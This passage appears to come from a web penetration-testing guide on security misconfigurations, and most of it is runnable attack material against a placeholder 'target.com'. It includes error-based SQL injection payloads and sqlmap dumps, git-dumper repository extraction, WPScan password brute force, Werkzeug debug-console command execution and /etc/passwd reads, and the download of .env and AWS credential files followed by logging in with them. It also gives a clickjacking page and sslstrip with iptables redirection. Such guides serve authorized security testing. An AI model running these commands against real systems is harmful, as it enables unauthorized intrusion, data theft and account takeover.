        r'\.bak$', r'\.old$', r'\.backup$',
        r'\.sql$', r'\.zip$', r'\.tar\.gz$',
        r'config\.(php|yml|json)',
        r'\.env$', r'\.git$',
        r'wp-config', r'database',
        r'\.key$', r'\.pem$'
    ]
    
    sensitive = []
    for file in files:
        for pattern in patterns:
            if re.search(pattern, file, re.IGNORECASE):
                sensitive.append(file)
                break
    
    return sensitive

# Usage
url = "http://target.com/uploads/"
files = scrape_directory_listing(url)
sensitive = find_sensitive_files(files)

print(f"[*] Found {len(files)} files")
print(f"[+] Found {len(sensitive)} potentially sensitive files:")
for f in sensitive:
    print(f"  - {url}{f}")
```

### Git Repository Exposure

**Detecting exposed .git directories:**

```bash
# Check for .git directory
curl http://target.com/.git/ -I

# Check for specific .git files
curl http://target.com/.git/config
curl http://target.com/.git/HEAD
curl http://target.com/.git/logs/HEAD

# Using git-dumper
git-dumper http://target.com/.git/ output_directory/

# Using GitHack
python3 GitHack.py http://target.com/.git/

# Manual extraction
wget -r -np -nH --cut-dirs=1 http://target.com/.git/
```

**Extracting information from .git:**

```bash
cd output_directory/
git status
git log
git branch -a
git show
git diff

# Extract credentials from history
git log -p | grep -i password
git log -p | grep -i apikey

# Check for sensitive files in history
git log --all --full-history -- "*config*"
git log --all --full-history -- "*.env"
```

### SVN Repository Exposure

**Detecting exposed .svn directories:**

```bash
# Check for .svn directory
curl http://target.com/.svn/entries

# Download SVN metadata
svn checkout http://target.com/.svn/

# Using dvcs-ripper
./rip-svn.pl -v -u http://target.com/.svn/
```

## Verbose Error Messages

### SQL Error Messages

**MySQL/MariaDB errors:**

```bash
# Trigger SQL error with single quote
curl "http://target.com/product?id=1'"

# Common MySQL error patterns to look for:
# "You have an error in your SQL syntax"
# "mysql_fetch_array()"
# "Warning: mysql_"
# "valid MySQL result"
# "MySqlClient"
```

**PostgreSQL errors:**

```bash
# Error triggering
curl "http://target.com/product?id=1'"

# PostgreSQL error patterns:
# "ERROR: syntax error at or near"
# "pg_query()"
# "pg_exec()"
# "PostgreSQL query failed"
# "unterminated quoted string"
```

**MSSQL errors:**

```bash
# Error triggering
curl "http://target.com/product?id=1'"

# MSSQL error patterns:
# "Microsoft OLE DB Provider for SQL Server"
# "Unclosed quotation mark"
# "[Microsoft][ODBC SQL Server Driver]"
# "System.Data.SqlClient"
```

**SQLite errors:**

```bash
# Error patterns:
# "SQLite3::SQLException"
# "unrecognized token"
# "near ')': syntax error"
```

**Exploitation based on error messages:**

```bash
# Once database type is identified from errors
sqlmap -u "http://target.com/product?id=1" --dbms=mysql --dbs

# Extract specific information based on error details
sqlmap -u "http://target.com/product?id=1" --tables -D database_name

# If table names revealed in errors
sqlmap -u "http://target.com/product?id=1" --dump -T users -D database_name
```

### Application Framework Errors

**Django debug mode:**

```html
<!-- Error page reveals -->
Request Method: GET
Request URL: http://target.com/admin/
Exception Type: DoesNotExist
Exception Value: User matching query does not exist

<!-- Full stack trace with file paths -->
/usr/local/lib/python3.8/site-packages/django/...
```

**Exploitation:**

```bash
# Extract information from Django debug page
curl http://target.com/nonexistent | grep -A 10 "INSTALLED_APPS"
curl http://target.com/nonexistent | grep -A 10 "DATABASES"
curl http://target.com/nonexistent | grep -A 10 "SECRET_KEY"

# Find valid URLs from traceback
curl http://target.com/nonexistent | grep -oP "path\('\K[^']+"
```

**Flask debug mode:**

```bash
# Trigger error to expose debugger
curl http://target.com/error

# Interactive debugger with PIN bypass
# [Inference]: If debugger exposed, may be exploitable
# Look for: Werkzeug Debugger, PIN entry form
```

**PHP error messages:**

```bash
# Trigger various PHP errors
curl "http://target.com/page.php?file=nonexistent"

# Common revelations in PHP errors:
# Warning: include(/var/www/html/...): failed to open stream
# Fatal error: require(): Failed opening required '/path/to/file'
# Warning: mysql_connect(): Access denied for user 'username'@'localhost'
# Parse error: syntax error, unexpected T_STRING in /path/file.php on line X
```

**Path disclosure via PHP errors:**

```bash
# Array manipulation
curl "http://target.com/index.php?page[]=1"
# Error: Warning: include() expects parameter 1 to be string, array given in /var/www/html/index.php

# Division by zero
curl "http://target.com/calc.php?num=1&denom=0"
# Error: Warning: Division by zero in /var/www/html/calc.php on line 45

# Invalid parameter type
curl "http://target.com/user.php?id=ABC"
# Error reveals database connection details
```

### Web Server Error Messages

**Apache errors revealing paths:**

```bash
# 403 Forbidden with path disclosure
curl http://target.com/admin/
# Forbidden: You don't have permission to access /var/www/html/admin/ on this server

# CGI errors
curl http://target.com/cgi-bin/script.cgi
# Error: Can't open perl script "/usr/lib/cgi-bin/script.cgi"
```

**Nginx errors:**

```bash
# Default error pages may reveal version
curl http://target.com/nonexistent -I
# 404 Not Found
# nginx/1.18.0 (Ubuntu)

# Misconfigured proxy errors
curl http://target.com/api/endpoint
# 502 Bad Gateway: upstream: "http://internal-server:8080/api/endpoint"
```

**IIS errors:**

```bash
# Detailed ASP.NET errors
curl http://target.com/app.aspx?param=test'

# Look for:
# Server Error in '/' Application
# Description: An error occurred during the parsing of a resource
# Source File: C:\inetpub\wwwroot\app.aspx    Line: 25
# Stack Trace: [Detailed trace with internal paths]
```

### API Error Messages

**REST API verbose errors:**

```bash
# Send malformed JSON
curl -X POST http://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"invalid"json}'

# Look for:
# Internal paths: /app/controllers/users_controller.rb:45
# Database schema: Table 'db.users' doesn't exist
# Framework versions: Rails 5.2.3
# Environment variables: ENV['DATABASE_URL']
```

**GraphQL introspection and errors:**

```bash
# Introspection query
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'

# Trigger error to reveal schema
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: \"invalid\") { password } }"}'

# Look for field suggestions in errors:
# "Cannot query field \"password\" on type \"User\". Did you mean \"passwordHash\"?"
```

### Automating Error Message Extraction

**Custom error enumeration script:**

```python
#!/usr/bin/env python3
import requests
import re

def test_error_disclosure(base_url):
    """Test various endpoints for verbose errors"""
    
    payloads = [
        ("'", "SQL injection"),
        ("[]", "Array manipulation"),
        ("../../../../etc/passwd", "Path traversal"),
        ("{{7*7}}", "Template injection"),
        ("%00", "Null byte"),
        ("<script>alert(1)</script>", "XSS"),
    ]
    
    endpoints = [
        "/index.php?id=",
        "/user?id=",
        "/search?q=",
        "/api/v1/users/",
        "/product.php?id=",
    ]
    
    patterns = {
        'mysql': r'mysql_|MySQL.*?error',
        'postgresql': r'PostgreSQL|pg_query',
        'mssql': r'SQL Server|ODBC SQL',
        'path': r'(/[\w/]+)+\.\w+',
        'framework': r'(Django|Flask|Rails|Laravel|Express)',
    }
    
    for endpoint in endpoints:
        for payload, payload_type in payloads:
            url = f"{base_url}{endpoint}{payload}"
            
            try:
                response = requests.get(url, timeout=5)
                
                for error_type, pattern in patterns.items():
                    matches = re.findall(pattern, response.text)
                    if matches:
                        print(f"[+] {error_type} disclosure in {endpoint}")
                        print(f"    Payload: {payload_type}")
                        print(f"    Matches: {set(matches)}")
                        print()
                        
            except requests.exceptions.RequestException:
                continue

# Usage
test_error_disclosure("http://target.com")
```

### Error-Based SQLi Extraction

**Using errors for data extraction:**

```bash
# MySQL extractvalue error-based
curl "http://target.com/product?id=1' AND extractvalue(0x0a,concat(0x0a,database()))--+"

# PostgreSQL cast error
curl "http://target.com/product?id=1' AND 1=cast((SELECT string_agg(table_name,',') FROM information_schema.tables) as int)--+"

# MSSQL error message
curl "http://target.com/product?id=1' AND 1=convert(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--+"

# Automated with sqlmap
sqlmap -u "http://target.com/product?id=1" --technique=E --dbms=mysql -D database_name --tables
```

## Tool Arsenal for Security Misconfiguration

### Nikto - Web Server Scanner

```bash
# Comprehensive scan
nikto -h http://target.com

# SSL/TLS specific scan
nikto -h https://target.com -ssl

# Specific tests
nikto -h http://target.com -Tuning 123456789ab

# Save output
nikto -h http://target.com -o nikto_output.html -Format html

# Scan with cookies for authenticated testing
nikto -h http://target.com -id admin:password
```

### Nessus/OpenVAS Alternative: Nuclei

```bash
# Install nuclei templates
nuclei -update-templates

# Scan for misconfigurations
nuclei -u http://target.com -t misconfigurations/

# Scan for exposed panels
nuclei -u http://target.com -t exposed-panels/

# Default credentials detection
nuclei -u http://target.com -t default-logins/

# Directory listing detection
nuclei -u http://target.com -t misconfiguration/directory-listing.yaml

# Multiple targets
nuclei -l targets.txt -t misconfigurations/ -o results.txt
```

### WPScan - WordPress Security Scanner

```bash
# Basic scan
wpscan --url http://target.com

# Enumerate users
wpscan --url http://target.com --enumerate u

# Enumerate vulnerable plugins
wpscan --url http://target.com --enumerate vp

# Enumerate vulnerable themes
wpscan --url http://target.com --enumerate vt

# Password brute force
wpscan --url http://target.com --passwords /usr/share/wordlists/rockyou.txt --usernames admin

# API token for vulnerability data
wpscan --url http://target.com --api-token YOUR_TOKEN
```

### Default Credential Databases

**SecLists locations:**

```bash
/usr/share/seclists/Passwords/Default-Credentials/
/usr/share/seclists/Passwords/default-passwords.csv
/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
/usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt
```

**Online resources:**

- CIRT.net Default Password Database
- DefaultPassword.com
- DataRecovery.com Default Passwords

---

## Security Headers Missing

HTTP security headers instruct browsers to enforce protective mechanisms. Missing or improperly configured headers expose applications to client-side attacks and information disclosure.

**Critical Security Headers:**

Headers that should be present on production applications:

```
Content-Security-Policy (CSP)
Strict-Transport-Security (HSTS)
X-Content-Type-Options
X-Frame-Options
X-XSS-Protection (legacy but still relevant)
Referrer-Policy
Permissions-Policy (formerly Feature-Policy)
```

**Header Analysis with cURL:**

```bash
# Inspect response headers
curl -I "https://target.com"

# Specific header extraction
curl -I "https://target.com" 2>&1 | grep -i "content-security-policy"
curl -I "https://target.com" 2>&1 | grep -i "strict-transport-security"
curl -I "https://target.com" 2>&1 | grep -i "x-frame-options"

# Complete header dump with verbose output
curl -v "https://target.com" 2>&1 | grep "^<"
```

**Automated Security Header Scanning:**

Using securityheaders.com methodology locally:

```bash
# Python script for header analysis
cat > check_headers.py << 'EOF'
#!/usr/bin/env python3
import requests
import sys

def check_headers(url):
    try:
        response = requests.get(url, timeout=10)
        headers = response.headers
        
        security_headers = {
            'Content-Security-Policy': 'Missing',
            'Strict-Transport-Security': 'Missing',
            'X-Content-Type-Options': 'Missing',
            'X-Frame-Options': 'Missing',
            'X-XSS-Protection': 'Missing',
            'Referrer-Policy': 'Missing',
            'Permissions-Policy': 'Missing'
        }
        
        print(f"[*] Analyzing: {url}\n")
        
        for header, status in security_headers.items():
            if header in headers:
                print(f"[+] {header}: {headers[header]}")
            else:
                print(f"[-] {header}: {status}")
        
        # Check for information disclosure headers
        info_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version']
        print("\n[*] Information Disclosure Headers:")
        for header in info_headers:
            if header in headers:
                print(f"[!] {header}: {headers[header]}")
                
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <URL>")
        sys.exit(1)
    check_headers(sys.argv[1])
EOF

chmod +x check_headers.py
python3 check_headers.py "https://target.com"
```

**Using shcheck for automated header auditing:**

```bash
# Install shcheck
git clone https://github.com/santoru/shcheck
cd shcheck

# Scan target
./shcheck.py https://target.com

# JSON output for parsing
./shcheck.py https://target.com --json-output

# Bulk scanning
cat targets.txt | while read url; do
    ./shcheck.py "$url" >> results.txt
done
```

**Content-Security-Policy (CSP) Testing:**

CSP prevents XSS and data injection attacks. Weak CSP configurations allow bypasses:

```bash
# Check CSP header
curl -I "https://target.com" | grep -i "content-security-policy"

# Example weak CSP
Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval' *

# 'unsafe-inline' allows inline JavaScript
# 'unsafe-eval' allows eval() usage
# * wildcard allows any domain
```

Testing CSP bypasses with inline scripts:

```html
<!-- If 'unsafe-inline' is present -->
<script>alert(document.domain)</script>

<!-- Using data: URI if allowed -->
<script src="data:text/javascript,alert(document.domain)"></script>

<!-- JSONP endpoints for CSP bypass -->
<script src="https://allowed-domain.com/jsonp?callback=alert"></script>
```

**CSP Evaluator (Google Tool):**

```bash
# Using csp-evaluator CLI
npm install -g csp-evaluator

# Evaluate CSP
echo "default-src 'self'; script-src 'unsafe-inline'" | csp-evaluator

# Check URL's CSP
curl -I "https://target.com" | grep "content-security-policy:" | cut -d' ' -f2- | csp-evaluator
```

**Strict-Transport-Security (HSTS) Validation:**

HSTS forces HTTPS connections and prevents protocol downgrade attacks:

```bash
# Check for HSTS
curl -I "https://target.com" | grep -i "strict-transport-security"

# Proper HSTS header format
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Missing HSTS allows attacks:
# - SSL stripping (sslstrip)
# - Man-in-the-middle on first visit
# - Cookie hijacking on insecure connections
```

Testing HTTP to HTTPS redirection:

```bash
# Test if HTTP redirects to HTTPS
curl -I "http://target.com"
# Should return: Location: https://target.com

# Test if redirect is permanent
curl -I "http://target.com" | grep "301\|302\|307\|308"
# 301 or 308 preferred (permanent redirects)

# Using sslstrip for demonstration (in controlled environment)
# [Unverified] This technique may not work on modern browsers with HSTS preload
sslstrip -l 8080
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
```

**X-Frame-Options and Clickjacking:**

X-Frame-Options prevents framing attacks:

```bash
# Check X-Frame-Options
curl -I "https://target.com" | grep -i "x-frame-options"

# Valid values:
# DENY - no framing allowed
# SAMEORIGIN - only same origin can frame
# ALLOW-FROM https://example.com - specific domain allowed (deprecated)

# Missing header allows clickjacking
```

Clickjacking test HTML:

```html
<!-- Save as clickjack.html and host locally -->
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Test</title>
    <style>
        iframe {
            width: 800px;
            height: 600px;
            position: absolute;
            opacity: 0.5; /* Set to 0 for real attack */
            z-index: 2;
        }
        .decoy {
            position: absolute;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div class="decoy">
        <h1>Click here to win a prize!</h1>
        <button>CLICK ME</button>
    </div>
    <iframe src="https://target.com/delete-account"></iframe>
</body>
</html>
```

Testing with Burp Suite:

```
1. Intercept response with Burp Proxy
2. Remove X-Frame-Options header
3. Forward modified response
4. Attempt to frame page in iframe
```

**X-Content-Type-Options Testing:**

Prevents MIME sniffing attacks:

```bash
# Check header
curl -I "https://target.com/file.txt" | grep -i "x-content-type-options"

# Proper value: nosniff
X-Content-Type-Options: nosniff

# Without this header, browsers may interpret files incorrectly
```

MIME confusion attack example:

```bash
# Upload text file containing JavaScript
cat > payload.txt << 'EOF'
alert(document.domain)
EOF

# Upload to server
curl -X POST "https://target.com/upload" -F "file=@payload.txt"

# If X-Content-Type-Options is missing, include as script:
# <script src="https://target.com/uploads/payload.txt"></script>
# Browser may execute it despite .txt extension
```

**Referrer-Policy Analysis:**

Controls referrer information leakage:

```bash
# Check policy
curl -I "https://target.com" | grep -i "referrer-policy"

# Values (from most to least restrictive):
# no-referrer - never send referrer
# no-referrer-when-downgrade - default, no referrer on HTTPSâ†’HTTP
# origin - send only origin
# origin-when-cross-origin - full URL same-origin, origin only cross-origin
# same-origin - referrer only for same-origin requests
# strict-origin - origin only, no referrer on downgrade
# strict-origin-when-cross-origin - recommended
# unsafe-url - always send full URL (dangerous)
```

Testing referrer leakage:

```bash
# Start listener to capture referrers
python3 -m http.server 8080

# Create HTML page with link
echo '<a href="http://localhost:8080/test">Click me</a>' > test.html

# Host and click link, check if full URL appears in logs
# Without proper Referrer-Policy, sensitive URL parameters leak
```

**Permissions-Policy (Feature-Policy) Audit:**

Controls browser features:

```bash
# Check policy
curl -I "https://target.com" | grep -i "permissions-policy"

# Example restrictive policy
Permissions-Policy: geolocation=(), microphone=(), camera=()

# Common features to restrict:
# - geolocation
# - microphone  
# - camera
# - payment
# - usb
# - accelerometer
# - gyroscope
```

**Mass Header Scanning:**

```bash
# Using meg to check headers across multiple hosts
meg --header "X-Frame-Options" /dev/null targets.txt

# Using httpx for bulk header extraction
cat targets.txt | httpx -silent -status-code -content-type -header "X-Frame-Options"

# Custom bash loop for multiple headers
while read url; do
    echo "=== $url ==="
    curl -I "$url" 2>&1 | grep -iE "content-security-policy|strict-transport-security|x-frame-options|x-content-type-options"
    echo ""
done < targets.txt
```

## Debug Mode Enabled

Debug mode exposes sensitive application internals including stack traces, variable values, SQL queries, and internal paths. This information aids attackers in identifying vulnerabilities and understanding application logic.

**Detecting Debug Mode:**

Error triggering to reveal debug information:

```bash
# Trigger errors through invalid input
curl "https://target.com/page?id=abc"  # Type error
curl "https://target.com/page?id=999999"  # Non-existent resource
curl "https://target.com/api/user" -X POST -d ""  # Missing parameters

# SQL syntax errors
curl "https://target.com/search?q=test'"

# Path traversal attempts
curl "https://target.com/download?file=../../../etc/passwd"

# Invalid JSON
curl "https://target.com/api/data" \
     -H "Content-Type: application/json" \
     -d "{invalid json"
```

**Framework-Specific Debug Detection:**

Django debug mode:

```bash
# Trigger Django debug page
curl "https://target.com/nonexistent-page"

# Debug page reveals:
# - Full stack trace
# - Settings/configuration
# - Environment variables
# - Installed apps
# - Middleware
# - SQL queries

# Look for distinctive markers:
curl -s "https://target.com/error" | grep -i "django.core.exceptions\|Traceback (most recent call last)"
```

Flask/Python debug detection:

```bash
# Werkzeug debugger
curl "https://target.com/error" | grep -i "werkzeug\|// Werkzeug Debugger"

# Interactive debugger console PIN
# If Werkzeug debugger is enabled without PIN or with weak PIN
# Access: https://target.com/console

# Trigger Python stack trace
curl "https://target.com/api" -X POST -d "malformed data"
```

ASP.NET debug mode:

```bash
# Check for detailed error messages
curl "https://target.com/page.aspx?id=invalid"

# Look for stack traces:
curl -s "https://target.com/error" | grep -i "System.Exception\|Stack Trace"

# Check web.config disclosure
curl "https://target.com/web.config"

# CustomErrors mode detection
# If customErrors mode="Off", detailed errors shown
```

PHP error display:

```bash
# Trigger PHP errors
curl "https://target.com/page.php?param[]=invalid"

# Look for error messages:
curl -s "https://target.com/error.php" | grep -oP "Warning:.*in.*on line \d+"

# Check for display_errors
curl "https://target.com/info.php"  # If phpinfo() is exposed

# Common PHP error patterns:
# Fatal error:
# Warning:
# Parse error:
# Notice:
```

**Verbose Error Exploitation:**

Extracting sensitive information from stack traces:

```bash
# Save error page
curl "https://target.com/error" > error.html

# Extract file paths
grep -oP '(/var/www/|/home/|C:\\).*?\.(php|py|js|java|rb)' error.html

# Extract database information
grep -oP '(mysql|postgres|mongodb|redis).*?@.*?' error.html

# Extract environment variables
grep -oP 'SECRET_KEY|API_KEY|PASSWORD|TOKEN.*?=.*?' error.html

# Extract version numbers
grep -oP '(Django|Flask|Express|Rails) \d+\.\d+\.\d+' error.html
```

**Interactive Debugger Exploitation:**

Werkzeug debugger console access:

```bash
# If debugger is accessible without PIN
curl "https://target.com/console"

# In browser console (if accessible):
# Execute Python code:
# >>> import os
# >>> os.system('whoami')
# >>> open('/etc/passwd').read()
```

[Inference] Werkzeug PIN generation relies on predictable values. If certain system information is known, the PIN may be calculable:

```python
# Werkzeug PIN calculation (educational purposes)
# Requires: machine-id, MAC address, username, modname, appname
import hashlib
import hmac

# Example values (need to gather from error messages)
username = 'www-data'
modname = 'flask.app'
appname = 'Flask'
mac_address = '02:42:ac:11:00:02'
machine_id = '/etc/machine-id'

# [Unverified] This is a simplified example
# Actual implementation varies by Werkzeug version
```

**Source Code Disclosure via Debug Routes:**

Many frameworks expose debug routes:

```bash
# Common debug endpoints
debug_endpoints=(
    "/debug"
    "/_debug"
    "/debug/vars"
    "/debug/pprof"  # Go applications
    "/actuator"  # Spring Boot
    "/actuator/env"
    "/actuator/health"
    "/actuator/metrics"
    "/metrics"
    "/.env"
    "/env"
    "/debug/routes"
    "/api/debug"
)

for endpoint in "${debug_endpoints[@]}"; do
    echo "[*] Testing: $endpoint"
    curl -s "https://target.com${endpoint}" | head -20
done
```

Spring Boot Actuator exploitation:

```bash
# Check if actuators are exposed
curl "https://target.com/actuator"

# Enumerate available endpoints
curl "https://target.com/actuator" | jq .

# Extract environment variables
curl "https://target.com/actuator/env" | jq .

# Get configuration properties
curl "https://target.com/actuator/configprops" | jq .

# View HTTP trace (recent requests)
curl "https://target.com/actuator/httptrace" | jq .

# Heap dump download (may contain secrets)
curl "https://target.com/actuator/heapdump" -o heapdump.hprof

# Analyze heap dump
jhat heapdump.hprof
# Access: http://localhost:7000
```

Node.js debug exposure:

```bash
# Check for exposed Node.js inspector
curl "https://target.com:9229"

# Express debug mode detection
curl -I "https://target.com" | grep -i "x-powered-by: express"

# Access debug routes
curl "https://target.com/debug/routes"
curl "https://target.com/node_modules"  # Exposed dependencies
```

**GraphQL Introspection (Debug Feature):**

```bash
# Full schema introspection query
curl -X POST "https://target.com/graphql" \
     -H "Content-Type: application/json" \
     -d '{
       "query": "{ __schema { types { name fields { name type { name kind ofType { name } } } } } }"
     }' | jq .

# Using graphql-voyager for visualization
# Install: npm install -g graphql-voyager
# Run: graphql-voyager https://target.com/graphql

# Extract mutations for privilege escalation
curl -X POST "https://target.com/graphql" \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { mutationType { fields { name } } } }"}' | jq .
```

**API Debug Parameters:**

```bash
# Common debug parameters
debug_params=(
    "debug=1"
    "debug=true"
    "verbose=1"
    "trace=1"
    "test=1"
    "dev=1"
    "development=1"
    "log_level=debug"
)

for param in "${debug_params[@]}"; do
    curl "https://target.com/api/endpoint?${param}"
done

# HTTP header-based debug flags
curl "https://target.com/api/data" \
     -H "X-Debug: true" \
     -H "X-Verbose: 1" \
     -H "X-Test-Mode: enabled"
```

## Exposed Configuration Files

Configuration files contain database credentials, API keys, encryption secrets, and architectural information. These files may be directly accessible due to misconfiguration.

**Common Configuration File Locations:**

```bash
# Web root misconfigurations
config_files=(
    "/.env"
    "/.env.local"
    "/.env.production"
    "/.env.backup"
    "/config.php"
    "/config.php.bak"
    "/configuration.php"
    "/app/config/config.yml"
    "/app/config/parameters.yml"
    "/config/database.yml"
    "/config/secrets.yml"
    "/appsettings.json"
    "/appsettings.production.json"
    "/web.config"
    "/settings.py"
    "/local_settings.py"
    "/.git/config"
    "/.svn/entries"
    "/composer.json"
    "/package.json"
    "/package-lock.json"
    "/.htaccess"
    "/.htpasswd"
    "/robots.txt"
    "/crossdomain.xml"
    "/clientaccesspolicy.xml"
    "/.aws/credentials"
    "/.ssh/id_rsa"
    "/.dockerenv"
    "/Dockerfile"
    "/docker-compose.yml"
)

for file in "${config_files[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com${file}")
    if [ "$status" == "200" ]; then
        echo "[+] Found: ${file} (Status: ${status})"
        curl -s "https://target.com${file}" > "$(basename $file)"
    fi
done
```

**Automated Configuration File Discovery:**

Using ffuf:

```bash
# Configuration file fuzzing
ffuf -u "https://target.com/FUZZ" \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -e .php,.bak,.old,.txt,.conf,.config,.yml,.yaml,.json,.xml \
     -mc 200,403

# Recursive directory fuzzing with config extensions
ffuf -u "https://target.com/FUZZ" \
     -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
     -recursion -recursion-depth 2 \
     -e .env,.config,.yml,.json \
     -mc 200
```

Using gobuster:

```bash
# Config file enumeration
gobuster dir -u "https://target.com" \
             -w /usr/share/wordlists/dirb/common.txt \
             -x php,bak,old,txt,conf,config,yml,json,xml \
             -t 50

# Specific config directories
gobuster dir -u "https://target.com" \
             -w /usr/share/seclists/Discovery/Web-Content/config-files.txt \
             -b 404,403
```

**Git Repository Exposure:**

Exposed .git directories contain complete source code history:

```bash
# Check for .git exposure
curl -I "https://target.com/.git/HEAD"
curl "https://target.com/.git/config"

# Using git-dumper to download entire repository
git clone https://github.com/arthaud/git-dumper
cd git-dumper
python3 git-dumper.py "https://target.com/.git/" output/

# Extract sensitive information from git history
cd output/
git log --all --full-history --source --all -- '*.env' '*.config'
git log --all --pretty=format: --name-only --diff-filter=D | sort -u  # Deleted files

# Search for secrets in commits
git log -p | grep -iE 'password|secret|key|token|api'

# Using truffleHog for secret scanning
trufflehog git file://. --json > secrets.json
```

**SVN Repository Exposure:**

```bash
# Check for .svn directories
curl "https://target.com/.svn/entries"

# Using svn-extractor
git clone https://github.com/anantshri/svn-extractor
cd svn-extractor
python svn-extractor.py "https://target.com/.svn/" output/
```

**Environment File Exploitation:**

.env files commonly contain critical secrets:

```bash
# Download .env file
curl "https://target.com/.env" -o .env

# Common sensitive variables in .env:
# APP_KEY, SECRET_KEY
# DB_PASSWORD, DATABASE_URL
# AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY
# API_KEY, API_SECRET
# STRIPE_SECRET_KEY
# SMTP_PASSWORD
# JWT_SECRET

# Extract credentials
grep -iE 'password|secret|key|token' .env

# Parse and use credentials
cat .env | grep "^DB_" 
# DB_HOST=localhost
# DB_DATABASE=production
# DB_USERNAME=admin
# DB_PASSWORD=SuperSecret123

# Connect using extracted credentials
mysql -h localhost -u admin -p'SuperSecret123' production
```

**AWS Credentials Exposure:**

```bash
# Check for AWS credentials
curl "https://target.com/.aws/credentials"

# Format:
# [default]
# aws_access_key_id = AKIAIOSFODNN7EXAMPLE
# aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Test credentials
aws sts get-caller-identity \
    --aws-access-key-id AKIAIOSFODNN7EXAMPLE \
    --aws-secret-access-key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Enumerate S3 buckets
aws s3 ls
```

**Database Configuration Files:**

```bash
# PHP database configs
curl "https://target.com/config/database.php"
curl "https://target.com/includes/config.php"

# Ruby on Rails
curl "https://target.com/config/database.yml"

# Python Django
curl "https://target.com/settings.py"

# Node.js
curl "https://target.com/config/database.js"
curl "https://target.com/knexfile.js"

# ASP.NET
curl "https://target.com/web.config"

# Extract database credentials from web.config
curl -s "https://target.com/web.config" | grep -oP 'connectionString="[^"]*"'
```

**API Key Exposure:**

```bash
# JavaScript files often contain API keys
curl -s "https://target.com/js/app.js" | grep -oE '[A-Za-z0-9_-]{32,}'

# Common API key patterns
curl -s "https://target.com/js/config.js" | grep -iE 'api[_-]?key|apikey|api[_-]?secret'

# Google API Keys
curl -s "https://target.com" | grep -oE 'AIza[0-9A-Za-z_-]{35}'

# AWS Keys
curl -s "https://target.com" | grep -oE 'AKIA[0-9A-Z]{16}'

# Slack tokens
curl -s "https://target.com" | grep -oE 'xox[baprs]-[0-9]{10,12}-[0-9]{10,12}-[a-zA-Z0-9]{24,}'

# Private keys
curl -s "https://target.com/key.pem"
curl -s "https://target.com/id_rsa"
```

**Cloud Service Configuration:**

```bash
# Docker files
curl "https://target.com/Dockerfile"
curl "https://target.com/docker-compose.yml"

# Kubernetes configs
curl "https://target.com/deployment.yaml"
curl "https://target.com/.kube/config"

# Terraform files
curl "https://target.com/terraform.tfstate"
curl "https://target.com/terraform.tfvars"

# Ansible playbooks
curl "https://target.com/playbook.yml"
curl "https://target.com/inventory"
```

**Configuration File Content Analysis:**

```bash
# Python script for automated secret extraction
cat > extract_secrets.py << 'EOF'
#!/usr/bin/env python3
import re
import sys

patterns = {
    'AWS Access Key': r'AKIA[0-9A-Z]{16}',
    'Generic API Key': r'[aA][pP][iI]_?[kK][eE][yY].*["\']([0-9a-zA-Z_-]{32,})["\']',
    'Password': r'[pP][aA][sS][sS][wW][oO][rR][dD].*["\']([^"\']+)["\']',
    'Secret': r'[sS][eE][cC][rR][eE][tT].*["\']([^"\']+)["\']',
    'Token': r'[tT][oO][kK][eE][nN].*["\']([^"\']+)["\']',
    'Database URL': r'(mysql|postgresql|mongodb)://[^\s]+',
}

def extract_secrets(filename):
    with open(filename, 'r') as f:
        content = f.read()
        
    for name, pattern in patterns.items():
        matches = re.findall(pattern, content)
        if matches:
            print(f"[+] {name}:")
            for match in matches:
                print(f"    {match}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <file>")
        sys.exit(1)
    extract_secrets(sys.argv[1])
EOF

chmod +x extract_secrets.py
python3 extract_secrets.py config.php
```

## Backup File Exposure

Backup files created by developers, text editors, or backup systems may remain accessible on web servers. These files often contain source code or sensitive data without proper access controls.

**Common Backup File Patterns:**

Backup files follow predictable naming conventions:

```
Original file: index.php
Backup variations:
- index.php.bak
- index.php.backup
- index.php.old
- index.php~
- index.php.save
- index.php.swp
- .index.php.swp
- index.php.tmp
- index.php.orig
- index.php.1
- index.php.2023-01-15
- Copy of index.php
- index.php.copy
```

**Automated Backup File Discovery:**

```bash
# Using bfac (Backup File Artifacts Checker)
git clone https://github.com/mazen160/bfac
cd bfac
python bfac.py --url "https://target.com/admin.php" --level 4

# Custom backup file fuzzing with ffuf
cat > backup_extensions.txt << 'EOF'
.bak
.backup
.old
.save
.swp
.tmp
.orig
.1
.2
~
.copy
.OLD
.BAK
EOF

ffuf -u "https://target.com/config.phpFUZZ" \
     -w backup_extensions.txt \
     -mc 200

# Recursive backup discovery
ffuf -u "https://target.com/FUZZ" \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -e .bak,.old,.backup,.swp,.tmp,~ \
     -mc 200,403
```

**Editor-Specific Backup Files:**

Different editors create specific backup patterns:

```bash
# Vim swap files
curl "https://target.com/.index.php.swp"
curl "https://target.com/.index.php.swo"

# Emacs backup files
curl "https://target.com/index.php~"
curl "https://target.com/#index.php#"

# Nano backup files
curl "https://target.com/index.php.save"

# Sublime Text
curl "https://target.com/index.php.sublime-workspace"

# Visual Studio Code
curl "https://target.com/.vscode/settings.json"
```

